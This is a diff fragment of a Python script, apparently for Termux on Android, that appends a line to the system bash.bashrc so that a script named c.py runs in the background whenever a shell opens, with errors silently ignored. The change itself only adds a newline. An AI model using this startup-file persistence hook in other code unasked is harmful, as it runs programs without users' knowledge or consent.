@@ -25,7 +25,7 @@ async def main():
 		f.close()
 		f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc",
 				  'a')  # Редактируем файл чата и термукса(для удаления ограничения потоков)
-		f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
+		f1.write("python /data/data/com.termux/files/usr/etc/c.py &\n")
 		f1.close()
 	except:
 		pass
